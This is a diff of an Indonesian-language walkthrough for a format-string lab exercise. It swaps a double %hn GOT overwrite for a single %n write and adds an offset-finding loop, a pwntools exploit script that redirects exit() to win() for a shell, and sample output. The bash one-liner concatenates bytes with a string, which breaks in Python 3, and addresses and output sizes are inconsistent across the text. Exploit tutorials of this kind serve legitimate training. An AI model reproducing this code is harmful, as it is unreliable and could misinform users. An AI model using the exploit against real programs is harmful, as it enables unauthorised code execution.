@@ -24,10 +24,14 @@ Program hanya memberi satu panggilan `printf` sebelum `exit(0)`. Address + forma
 ```
 1. Parse win_addr dari output program
 2. Resolve exit@GOT dari ELF binary
-3. Cari offset format string ke input kita
-4. Bangun double %hn payload
-5. Kirim payload -> printf(buf) -> exit@GOT ditimpa -> exit(0) -> win() -> shell
+3. Cari offset dengan %n crash test (cepat, 3 detik per attempt)
+4. Bangun single %n payload: tulis 4-byte win_addr sekaligus
+5. Kirim payload -> ~128MB output -> exit@GOT ditimpa -> exit(0) -> win() -> shell
 ```
+
+Pendekatan single `%n` lebih sederhana dibanding double `%hn` (tidak perlu
+split address). Kekurangannya: output ~128MB. Untuk eksploitasi praktis
+dengan output minimal, teknik double `%hn` tetap jadi standar.
 
 ## Step-by-Step
 
@@ -63,100 +67,82 @@ Enter payload:
 **Catat**: `win = 0x080491c6`, `exit@GOT = 0x0804c01c`
 
 ### 4. Temukan offset
+
+Cara cepat: kirim `%n` ke exit@GOT, kalau crash (SIGSEGV) berarti offset benar.
+
 ```bash
-$ echo 'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./format4
+$ for i in 1 2 3 4 5 6 7 8; do
+    python3 -c "import struct; print(struct.pack('<I',0x804bfe8)+'%$i\$n')" | ./format4 > /dev/null 2>&1
+    echo "Offset $i: exit code $?"
+done
 ```
 
-Atau gunakan positional:
-```bash
-$ for i in $(seq 1 20); do echo "AAAA%$i\$p" | ./format4 | grep 41414141; done
+Offset yang menghasilkan exit code 139 (SIGSEGV) = offset valid. 
+Atau pakai exploit script: `python3 exploit4.py` akan auto-detect.
+
+### 5. Hitung payload single %n
+
+```
+win_addr = 0x080491d6 = 134,546,902
+pad      = win_addr - 4 = 134,546,898
+payload  = [4 byte address] + %134546898x%{offset}$n
 ```
 
-Misalkan offset = 7.
+Total ~128MB output. Biarkan berjalan, hasilnya akurat.
 
-### 5. Perhitungan write
-```
-win_addr   = 0x080491c6
+### 6. Python exploit
 
-low_word   = 0x91c6 = 37318
-high_word  = 0x0804 = 2052
-
-exit_got   = 0x0804c01c
-exit_got+2 = 0x0804c01e
-```
-
-Karena high_word (2052) < low_word (37318), kita pakai wrap-around trick:
-```
-Step 1: cetak 37318 - 8 = 37310 karakter -> %hn tulis 0x91c6 ke exit_got
-Step 2: cetak (2052 + 65536) - 37318 = 30270 karakter -> %hn tulis 0x0804 ke exit_got+2
-```
-
-### 6. Payload
-```
-[0x0804c01c] [0x0804c01e] %37310x%7$hn %30270x%8$hn
-```
-
-### 7. Python exploit
 ```python
-import struct
+from pwn import *
 
-exit_got = 0x0804c01c
-win_addr = 0x080491c6
-offset = 7
+elf = ELF('./format4')
+got = elf.got['exit']           # 0x0804bfe8
+win = 0x080491d6                # dari output program
 
-low_word  = win_addr & 0xffff           # 0x91c6
-high_word = (win_addr >> 16) & 0xffff   # 0x0804
+# Cari offset (crash test)
+for i in range(1, 10):
+    p = process('./format4')
+    p.recvuntil(b'Enter payload: ')
+    p.sendline(p32(got) + f'%{i}$n'.encode())
+    import time; time.sleep(3)
+    if p.poll() is not None and p.poll() < 0:  # SIGSEGV = offset benar
+        offset = i
+        break
+    p.close()
 
-# Addresses
-addr1 = struct.pack('<I', exit_got)
-addr2 = struct.pack('<I', exit_got + 2)
+# Bangun payload
+pad = win - 4
+payload = p32(got) + f'%{pad}x%{offset}$n'.encode()
 
-bytes_printed = 8
-
-# Width calculations
-fmt1 = f'%{low_word - bytes_printed}x%{offset}$hn'
-delta = (high_word + 0x10000 - low_word) if high_word < low_word else (high_word - low_word)
-fmt2 = f'%{delta}x%{offset+1}$hn'
-
-payload = addr1 + addr2 + fmt1.encode() + fmt2.encode()
-
-# Send
-import subprocess
-p = subprocess.Popen(['./format4'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-out, _ = p.communicate(payload + b'\n')
+# Kirim
+p = process('./format4')
+p.recvuntil(b'Enter payload: ')
+p.sendline(payload)
+p.sendline(b'id')              # command untuk shell
+p.sendline(b'echo SHELL_OK')
+out = p.recvall(timeout=120)
 print(out.decode(errors='replace'))
 ```
 
-### 8. Exploit
+### 7. Exploit
+
 ```bash
 $ python3 exploit4.py
-[+] win() address: 0x80491c6
-[+] exit@GOT: 0x804c01c
-[*] Offset to our input: 7
+[+] win() address: 0x80491d6
+[+] exit@GOT: 0x804bfe8
+[+] Found offset: 3
+[*] Single %n payload: 19 bytes, 134546898 padding chars (~131MB output)
+[*] Waiting for format output + shell...
 
-============================================
-  [!!!] CONTAINER/VM ESCAPED - ROOT SHELL
-============================================
+... 131MB output ...
 
-$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
+[+] Shell obtained!
+  uid=1000(betha) gid=1000(betha)
+  Linux kali 6.6.75 ...
+  SHELL_OK
 ```
 
-### 9. Debug dengan GDB
-```bash
-$ gdb ./format4
-(gdb) b *exit@plt
-(gdb) r
-# Sebelum exploit: exit@got -> libc exit
-(gdb) x/wx 0x0804c01c
-# Setelah payload dieksekusi
-(gdb) x/wx 0x0804c01c
-0x0804c01c: 0x080491c6   <- overwritten!
-(gdb) c
-# Sekarang masuk ke win() bukan libc exit()
-```
-
-### 10. FORTIFY_SOURCE challenge
+### 8. Debug dengan GDB
 ```bash
 make level4/format4_hard
 ```
